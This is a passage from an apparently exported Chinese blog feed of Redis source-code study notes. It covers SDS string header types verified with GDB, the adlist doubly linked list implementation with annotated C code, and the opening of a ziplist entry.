<p>详细分析过程参考文章：<a href="https://segmentfault.com/a/1190000017450295">https://segmentfault.com/a/1190000017450295</a></p>
<p>以下仅给出结论和验证结果：</p>
<p><strong>结论：</strong></p>
<ul>
<li><p><strong>对于长度小于32的字符串键和值，键通过sdshdr5表示，而值通过sdshdr8表示</strong></p>
</li>
<li><p>对于值，使用<code>createEmbeddedStringObject</code>总是创建一个sdshdr8类型的对象。</p>
</li>
<li><p>对于键，通过调用链<code>setGenericCommand--&gt;genericSetKey--&gt;dbAdd</code>，最终调用<code>sdsdup</code>，创建一个sdshdr5类型的对象。调用栈参考：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#0  dbAdd (db=0x557b1c4d9690, key=0x557b1c4f5720, val=0x557b1c4f4730) at db.c:185</span><br><span class="line">#1  0x0000557b1b95751d in genericSetKey (c=c@entry=0x557b1c4ecfa0, db=0x557b1c4d9690, key=key@entry=0x557b1c4f5720,</span><br><span class="line">    val=val@entry=0x557b1c4f4730, keepttl=keepttl@entry=0, signal=signal@entry=1) at db.c:252</span><br><span class="line">#2  0x0000557b1b9649e7 in setGenericCommand (c=c@entry=0x557b1c4ecfa0, flags=flags@entry=0, key=0x557b1c4f5720,</span><br><span class="line">    val=0x557b1c4f4730, expire=expire@entry=0x0, unit=unit@entry=0, ok_reply=0x0, abort_reply=0x0) at t_string.c:87</span><br><span class="line">#3  0x0000557b1b964c51 in setCommand (c=0x557b1c4ecfa0) at t_string.c:146</span><br><span class="line">#4  0x0000557b1b93bd5e in call (c=0x557b1c4ecfa0, flags=15) at server.c:3368</span><br><span class="line">#5  0x0000557b1b93c7a5 in processCommand (c=c@entry=0x557b1c4ecfa0) at server.c:3797</span><br><span class="line">#6  0x0000557b1b94a7b0 in processCommandAndResetClient (c=c@entry=0x557b1c4ecfa0) at networking.c:1895</span><br><span class="line">#7  0x0000557b1b94f09a in processInputBuffer (c=0x557b1c4ecfa0) at networking.c:1978</span><br><span class="line">#8  0x0000557b1b9cbd48 in callHandler (handler=&lt;optimized out&gt;, conn=0x557b1c4fdd60) at connhelpers.h:79</span><br><span class="line">#9  connSocketEventHandler (el=&lt;optimized out&gt;, fd=&lt;optimized out&gt;, clientData=0x557b1c4fdd60, mask=&lt;optimized out&gt;)</span><br><span class="line">    at connection.c:296</span><br><span class="line">#10 0x0000557b1b9356c7 in aeProcessEvents (eventLoop=eventLoop@entry=0x557b1c479aa0, flags=flags@entry=27) at ae.c:479</span><br><span class="line">#11 0x0000557b1b935a0d in aeMain (eventLoop=0x557b1c479aa0) at ae.c:539</span><br><span class="line">#12 0x0000557b1b932216 in main (argc=2, argv=0x7ffe8e366c18) at server.c:5498</span><br></pre></td></tr></table></figure>

<p><strong>GDB验证结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/tb ((*(robj *)server.db[0].dict.ht[0].table[1].v).ptr - 1) // value</span><br><span class="line">0x557b1c4f4742: 00000001	// 注意value的最后三位为001，表示SDS_TYPE_8</span><br><span class="line">$2 = &#123;len = 5 &#x27;\005&#x27;, alloc = 5 &#x27;\005&#x27;, flags = 1 &#x27;\001&#x27;, buf = 0x557b1c4f4743 &quot;hello&quot;&#125;</span><br><span class="line"></span><br><span class="line">(gdb) p (sds)server.db[0].dict.ht[0].table[1].key</span><br><span class="line">$3 = (sds) 0x557b1c502f61 &quot;key&quot;</span><br><span class="line">(gdb) x/tb 0x557b1c502f61 - 0x1</span><br><span class="line">0x557b1c502f60: 00011000	// 注意key的最后三位为000，表示SDS_TYPE_5</span><br></pre></td></tr></table></figure>

<p><strong>思考问题</strong>：对于短字符串，为什么键底层类型为sdshdr5，值底层类型设置却成sdshdr8？</p>
<p>个人分析：实际应用场景中，通常键的更新次数远小于值的更新次数。所以对键采用最小的内存存储，以节省空间；对值用更大的内存存储，减少内存重分配的次数，提高性能。</p>
<h4><span id="redis字符串命令">REDIS字符串命令<span id="jump18"></span></span></h4><p>REDIS 字符串命令参考官方网站：<a href="https://redis.io/commands#string">https://redis.io/commands#string</a></p>
<p>以下仅给出几个最常用的命令:</p>
<ul>
<li>set key value</li>
<li>get key</li>
<li>append key value</li>
</ul>
<h2><span id="参考资料">参考资料</span></h2><p>【1】《Redis设计与实现》第2章 简单动态字符串，第8章 对象</p>
<p>【2】<a href="https://blog.huangz.me/diary/2014/how-to-read-redis-source-code.html">如何阅读Redis源码</a></p>
<p>【3】<a href="https://segmentfault.com/a/1190000017450295">【Redis源码分析】一个对SDSHDR5是否使用的疑问</a></p>
<p>【4】<a href="https://www.cnblogs.com/davygeek/p/5748852.html">柔性数组</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(二)——链表</title>
    <url>/2021/1212203239.html</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>链表在Redis中的应用非常广泛，链表是列表键的底层实现之一，发布订阅，慢查询，监视器等功能也用到了链表。</p>
<p>以下给出Redis中链表相关的一些思考问题，通过源码分析，给出问题的答案，掌握链表的底层实现原理和设计思路。</p>
<p>源码版本：<a href="https://github.com/redis/redis/releases/tag/6.0.10">Redis 6.0.10</a></p>
<span id="more"></span>

<h2><span id="问题思考">问题思考</span></h2><p>C语言中如何设计一个通用的泛型链表？</p>
<ul>
<li><p><a href="#jump1">Redis中的链表和链表节点的实现</a></p>
<ul>
<li><a href="#jump2">节点值的类型是void *，这样设计有什么好处？</a></li>
<li><a href="#jump3">仅使用多个listNode也能组成链表，为什么还要额外用一个list结构去持有链表？</a></li>
<li><a href="#jump4">为什么用双向链表，不用单链表？</a></li>
</ul>
</li>
<li><p><a href="#jump5">双向链表API实现分析</a></p>
<ul>
<li><a href="#jump6">链表创建</a></li>
<li><a href="#jump7">链表销毁</a></li>
<li><a href="#jump8">头部插入节点</a></li>
<li><a href="#jump9">尾部插入节点</a></li>
<li><a href="#jump10">指定位置前后插入节点</a></li>
<li><a href="#jump11">删除指定节点</a></li>
<li><a href="#jump12">链表迭代器的设计实现</a></li>
<li><a href="#jump13">查找指定节点</a></li>
<li><a href="#jump14">复制链表</a></li>
<li><a href="#jump15">表头节点移动到表尾</a></li>
</ul>
</li>
</ul>
<h3><span id="链表和链表节点的实现">链表和链表节点的实现<span id="jump1"></span></span></h3><p>以REDIS 6.0.10源码为例，链表的实现参考<code>adlist.h</code>, <code>adlist.c</code></p>
<p>链表节点通过listNode结构体实现，定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> *value;</span><br><span class="line">&#125; listNode;</span><br></pre></td></tr></table></figure>

<p>可以看出这是一个双向链表，value存储节点值，其类型为void *</p>
<h4><span id="节点值的类型为void-这样设计有什么好处">节点值的类型为void *，这样设计有什么好处？<span id="jump2"></span></span></h4><p>节点值设置void *类型，目的是实现一个通用的泛型链表，提高代码复用性。（类似C++的STL容器，多态思想）</p>
<p>考虑实际应用场景中，链表节点值的类型可以是int, float, double等基本类型, 或者是自定义结构体类型，如果简单将value定义为某个具体类型，就只能为每个节点类型定义一个listNodeXX的结构体，同时需额外为每个节点类型新增一套增、删、改、查的API，实现非常繁琐，如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listNodeInt</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">&#125; listNodeInt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listNodeDouble</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">double</span> value;</span><br><span class="line">&#125; listNodeDouble;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加一个节点到链表头部</span></span><br><span class="line"><span class="built_in">list</span> *<span class="title function_">listAddNodeHeadInt</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, <span class="type">int</span> value)</span>;</span><br><span class="line"><span class="built_in">list</span> *<span class="title function_">listAddNodeHeadDouble</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, <span class="type">double</span> value)</span>;</span><br></pre></td></tr></table></figure>

<p>可以看出，这种实现方式的问题在于<strong>代码重复度过高，难以维护，且扩展性差，每支持一个新的节点类型都要新增代码</strong>，这显然是不能接受的。所以节点值类型要设计为void *</p>
<h4><span id="仅使用多个listnode也能组成链表为什么还要额外用一个list结构去持有链表-这样设计有什么好处">仅使用多个listNode也能组成链表，为什么还要额外用一个list结构去持有链表, 这样设计有什么好处？<span id="jump3"></span></span></h4><p>Redis中额外使用list结构，用于持有链表，简化操作。list结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list</span> &#123;</span></span><br><span class="line">    listNode *head;</span><br><span class="line">    listNode *tail;</span><br><span class="line">    <span class="type">void</span> *(*dup)(<span class="type">void</span> *ptr);</span><br><span class="line">    <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="type">void</span> *ptr);</span><br><span class="line">    <span class="type">int</span> (*match)(<span class="type">void</span> *ptr, <span class="type">void</span> *key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> len;</span><br><span class="line">&#125; <span class="built_in">list</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>head, tail用于记录表头指针和表尾指针，好处是获取表头节点或表尾节点的时间复杂度为O(1)</p>
</li>
<li><p>len类型用于记录链表长度， 好处是获取链表节点总数的时间复杂度为O(1)</p>
</li>
<li><p>dup, free, match成员用于实现多态链表，对于不同类型的节点，挂接不同的函数钩子，设置特定的复制、释放、比较操作。</p>
<ul>
<li>dup函数用于复制节点值</li>
<li>free函数用于释放节点值</li>
<li>match函数用于比较两个节点值是否相等</li>
</ul>
</li>
</ul>
<p><strong>举例</strong>：一个长度为2的双向链表示意图：<br><img data-src="/2021/1212203239/image1.png"></p>
<h3><span id="为什么用双向链表不用单链表">为什么用双向链表，不用单链表？<span id="jump4"></span></span></h3><p>双向链表相较于单链表，有如下优点：</p>
<ul>
<li>支持双向查找节点，且查找给定节点的前驱节点的时间复杂度为O(1)</li>
<li>尾部插入节点快，时间复杂度为O(1)</li>
</ul>
<h3><span id="双向链表api实现分析">双向链表API实现分析<span id="jump5"></span></span></h3><h4><span id="链表创建">链表创建<span id="jump6"></span></span></h4><p>调用<code>listCreate</code>，创建一个空的双向链表，时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> *<span class="title function_">listCreate</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list</span> *<span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">list</span> = zmalloc(<span class="keyword">sizeof</span>(*<span class="built_in">list</span>))) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;head = <span class="built_in">list</span>-&gt;tail = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;dup = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;<span class="built_in">free</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;match = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="链表销毁">链表销毁<span id="jump7"></span></span></h4><p>调用<code>listRelease</code>，释放链表，时间复杂度O(N)，N为链表长度</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">listRelease</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>)</span> &#123;</span><br><span class="line">    listEmpty(<span class="built_in">list</span>);</span><br><span class="line">    zfree(<span class="built_in">list</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">listEmpty</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> len;</span><br><span class="line">    listNode *current, *next;</span><br><span class="line"></span><br><span class="line">    current = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    len = <span class="built_in">list</span>-&gt;len;</span><br><span class="line">    <span class="keyword">while</span>(len--) &#123;</span><br><span class="line">        next = current-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">list</span>-&gt;<span class="built_in">free</span>) <span class="built_in">list</span>-&gt;<span class="built_in">free</span>(current-&gt;value);	<span class="comment">// 不同的节点类型，挂接不同的free函数钩子，实现多态链表的释放操作。</span></span><br><span class="line">        zfree(current);</span><br><span class="line">        current = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">list</span>-&gt;head = <span class="built_in">list</span>-&gt;tail = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="头部插入节点">头部插入节点<span id="jump8"></span></span></h4><p>调用<code>listAddNodeHead</code>，在链表头部插入节点，时间复杂度O(1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list *listAddNodeHead(list *list, void *value) &#123;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    if ((node = zmalloc(sizeof(*node))) == NULL)</span><br><span class="line">        return NULL;</span><br><span class="line">    node-&gt;value = value;</span><br><span class="line">    if (list-&gt;len == 0) &#123;</span><br><span class="line">        list-&gt;head = list-&gt;tail = node;</span><br><span class="line">        node-&gt;prev = node-&gt;next = NULL;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        node-&gt;prev = NULL;</span><br><span class="line">        node-&gt;next = list-&gt;head;</span><br><span class="line">        list-&gt;head-&gt;prev = node;</span><br><span class="line">        list-&gt;head = node;</span><br><span class="line">    &#125;</span><br><span class="line">    list-&gt;len++;</span><br><span class="line">    return list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="尾部插入节点">尾部插入节点<span id="jump9"></span></span></h4><p>调用<code>listAddNodeTail</code>, 在链表尾部插入节点，时间复杂度O(1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list *listAddNodeTail(list *list, void *value) &#123;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    if ((node = zmalloc(sizeof(*node))) == NULL)</span><br><span class="line">        return NULL;</span><br><span class="line">    node-&gt;value = value;</span><br><span class="line">    if (list-&gt;len == 0) &#123;</span><br><span class="line">        list-&gt;head = list-&gt;tail = node;</span><br><span class="line">        node-&gt;prev = node-&gt;next = NULL;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        node-&gt;prev = list-&gt;tail;</span><br><span class="line">        node-&gt;next = NULL;</span><br><span class="line">        list-&gt;tail-&gt;next = node;</span><br><span class="line">        list-&gt;tail = node;</span><br><span class="line">    &#125;</span><br><span class="line">    list-&gt;len++;</span><br><span class="line">    return list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="指定位置前后插入节点">指定位置前后插入节点<span id="jump10"></span></span></h4><p>调用<code>listInsertNode</code>，在指定位置之前或之后插入节点，时间复杂度O(1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list *listInsertNode(list *list, listNode *old_node, void *value, int after) &#123;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    if ((node = zmalloc(sizeof(*node))) == NULL)</span><br><span class="line">        return NULL;</span><br><span class="line">    node-&gt;value = value;</span><br><span class="line">    if (after) &#123;</span><br><span class="line">        node-&gt;prev = old_node;</span><br><span class="line">        node-&gt;next = old_node-&gt;next;</span><br><span class="line">        if (list-&gt;tail == old_node) &#123;</span><br><span class="line">            list-&gt;tail = node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        node-&gt;next = old_node;</span><br><span class="line">        node-&gt;prev = old_node-&gt;prev;</span><br><span class="line">        if (list-&gt;head == old_node) &#123;</span><br><span class="line">            list-&gt;head = node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (node-&gt;prev != NULL) &#123;</span><br><span class="line">        node-&gt;prev-&gt;next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    if (node-&gt;next != NULL) &#123;</span><br><span class="line">        node-&gt;next-&gt;prev = node;</span><br><span class="line">    &#125;</span><br><span class="line">    list-&gt;len++;</span><br><span class="line">    return list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>after等于1时，在给定old_node节点之后插入，否则在给定节点前插入。</p>
<h4><span id="删除指定节点">删除指定节点<span id="jump11"></span></span></h4><p>调用<code>listDelNode</code>， 删除指定节点，时间复杂度为O(1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void listDelNode(list *list, listNode *node) &#123;</span><br><span class="line">    if (node-&gt;prev)</span><br><span class="line">        node-&gt;prev-&gt;next = node-&gt;next;</span><br><span class="line">    else</span><br><span class="line">        list-&gt;head = node-&gt;next;</span><br><span class="line">    if (node-&gt;next)</span><br><span class="line">        node-&gt;next-&gt;prev = node-&gt;prev;</span><br><span class="line">    else</span><br><span class="line">        list-&gt;tail = node-&gt;prev;</span><br><span class="line">    if (list-&gt;free) list-&gt;free(node-&gt;value);</span><br><span class="line">    zfree(node);</span><br><span class="line">    list-&gt;len--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="链表迭代器的设计实现">链表迭代器的设计实现<span id="jump12"></span></span></h4><p>定义<code>struct listIter</code>结构体实现链表的迭代器，支持双向迭代。(类似C++容器的begin()和rbegin()操作)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Directions for iterators */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AL_START_HEAD 0			<span class="comment">// 正向迭代, head -&gt; tail</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AL_START_TAIL 1			<span class="comment">// 反向迭代，tail -&gt; head</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listIter</span> &#123;</span></span><br><span class="line">    listNode *next;</span><br><span class="line">    <span class="type">int</span> direction;	<span class="comment">// 取值有两种，AL_START_HEAD或AL_START_TAIL，支持双向迭代。</span></span><br><span class="line">&#125; listIter;</span><br></pre></td></tr></table></figure>

<p>通过<code>listGetIterator</code>，创建一个正向&#x2F;反向迭代器：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">listIter *<span class="title function_">listGetIterator</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, <span class="type">int</span> direction)</span> &#123;</span><br><span class="line">    listIter *iter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((iter = zmalloc(<span class="keyword">sizeof</span>(*iter))) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (direction == AL_START_HEAD)		<span class="comment">// 正向迭代器</span></span><br><span class="line">        iter-&gt;next = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        iter-&gt;next = <span class="built_in">list</span>-&gt;tail;		<span class="comment">// 反向迭代器</span></span><br><span class="line">    iter-&gt;direction = direction;</span><br><span class="line">    <span class="keyword">return</span> iter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重置迭代器, 通过<code>listRewind</code>和<code>listRewindTail</code>方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">listRewind</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, listIter *li)</span> &#123;</span><br><span class="line">    li-&gt;next = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    li-&gt;direction = AL_START_HEAD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">listRewindTail</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, listIter *li)</span> &#123;</span><br><span class="line">    li-&gt;next = <span class="built_in">list</span>-&gt;tail;</span><br><span class="line">    li-&gt;direction = AL_START_TAIL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>listNext</code>，访问迭代器中的下一个元素：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">listNode *<span class="title function_">listNext</span><span class="params">(listIter *iter)</span> &#123;</span><br><span class="line">    listNode *current = iter-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (iter-&gt;direction == AL_START_HEAD)</span><br><span class="line">            iter-&gt;next = current-&gt;next;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            iter-&gt;next = current-&gt;prev;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="查找指定节点">查找指定节点<span id="jump13"></span></span></h4><p>调用<code>listSearchKey</code>，查找指定节点，平均时间复杂度O(N)，N为链表长度。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listNode *listSearchKey(list *list, void *key) &#123;</span><br><span class="line">    listIter iter;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    listRewind(list, &amp;iter);</span><br><span class="line">    while((node = listNext(&amp;iter)) != NULL) &#123;</span><br><span class="line">        if (list-&gt;match) &#123;</span><br><span class="line">            if (list-&gt;match(node-&gt;value, key)) &#123;</span><br><span class="line">                return node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (key == node-&gt;value) &#123;</span><br><span class="line">                return node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="复制链表">复制链表<span id="jump14"></span></span></h4><p>调用<code>listDup</code>，复制链表，时间复杂度O(N)，N为链表长度。</p>
<p><strong>实现技巧分析</strong>：通过迭代器隐藏链表内部实现，简化链表遍历操作；通过dup函数指针，统一了不同类型链表节点的复制流程，实现简洁优雅，值得一学。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> *<span class="title function_">listDup</span><span class="params">(<span class="built_in">list</span> *orig)</span> &#123;</span><br><span class="line">    <span class="built_in">list</span> *copy;</span><br><span class="line">    listIter iter;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((copy = listCreate()) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copy-&gt;dup = orig-&gt;dup;</span><br><span class="line">    copy-&gt;<span class="built_in">free</span> = orig-&gt;<span class="built_in">free</span>;</span><br><span class="line">    copy-&gt;match = orig-&gt;match;</span><br><span class="line">    listRewind(orig, &amp;iter);</span><br><span class="line">    <span class="keyword">while</span>((node = listNext(&amp;iter)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="type">void</span> *value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (copy-&gt;dup) &#123;</span><br><span class="line">            value = copy-&gt;dup(node-&gt;value);</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                listRelease(copy);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            value = node-&gt;value;</span><br><span class="line">        <span class="keyword">if</span> (listAddNodeTail(copy, value) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            listRelease(copy);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> copy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="表头节点移动到表尾">表头节点移动到表尾<span id="jump15"></span></span></h4><p>通过<code>listRotateHeadToTail</code>，实现表头节点移动到表尾，时间复杂度为O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">listRotateHeadToTail</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (listLength(<span class="built_in">list</span>) &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    listNode *head = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    <span class="comment">/* Detach current head */</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;head = head-&gt;next;</span><br><span class="line">    <span class="built_in">list</span>-&gt;head-&gt;prev = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* Move it as tail */</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;tail-&gt;next = head;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    head-&gt;prev = <span class="built_in">list</span>-&gt;tail;</span><br><span class="line">    <span class="built_in">list</span>-&gt;tail = head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>listRotateTailToHead</code>，实现表尾节点移动到表头，时间复杂度为O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">listRotateTailToHead</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (listLength(<span class="built_in">list</span>) &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detach current tail */</span></span><br><span class="line">    listNode *tail = <span class="built_in">list</span>-&gt;tail;</span><br><span class="line">    <span class="built_in">list</span>-&gt;tail = tail-&gt;prev;</span><br><span class="line">    <span class="built_in">list</span>-&gt;tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* Move it as head */</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;head-&gt;prev = tail;</span><br><span class="line">    tail-&gt;prev = <span class="literal">NULL</span>;</span><br><span class="line">    tail-&gt;next = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    <span class="built_in">list</span>-&gt;head = tail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="参考资料">参考资料</span></h2><p>【1】《Redis设计与实现》 第3章 链表</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(四)——ziplist</title>
    <url>/2021/1230204524.html</url>
    <content><![CDATA[<h2><span id="背景">背景</span></h2><p>ziplist是一种为节约内存而开发的数据结构，本质是一个字节数组。</p>
<p>ziplist是列表键和哈希键的底层实现之一，也用于quicklist的实现。</p>
<span id="more"></span>

<h2><span id="问题思考">问题思考</span></h2><p>双向链表结构，在<font color="red">存储数据本身长度远小于链表节点大小</font>的场景下，有严重的内存浪费问题。针对这种情况，Redis设计了ziplist这种节约内存的数据结构。以下给出ziplist相关的思考问题，了解ziplist的实现原理和设计思路。</p>
<ul>
<li><a href="#jump1">ziplist的数据结构</a></li>
<li><a href="#jump2">ziplist节点构成</a></li>
<li><a href="#jump3">为什么要设计ziplist</a></li>
<li><a href="#jump4">ziplist相关操作</a><ul>
<li><a href="#jump5">查找指定节点</a></li>
<li><a href="#jump6">连锁更新问题</a></li>
</ul>
</li>
<li>quicklist的数据结构</li>
<li>为什么要设计quicklist</li>
<li>quicklist的增、删、改、查操作</li>
</ul>
<h3><span id="ziplist的数据结构">ziplist的数据结构<span id="jump1"></span></span></h3><p>Redis没有专门定义结构体来表示ziplist，因为ziplist本质就是一个空间连续的字节数组。</p>
<p>ziplist中包含多个节点(entry)，每个节点存储一个字符串值或整数值，每个节点通过<code>struct zlentry</code>结构表示。</p>
<p>ziplist的各组成部分参考如下：<br><img data-src="/2021/1230204524/image1.png"></p>
<p>可以看出，ziplist由列表头 + 列表节点 + 列表尾这三部分组成。每个组成部分作用说明如下：</p>
<ul>
<li><code>zlbytes</code>占4字节，用于记录整个ziplist占用内存的总字节数，对于空表来说，<code>zlbytes</code>等于11，源码参考<code>ziplistNew</code></li>
</ul>
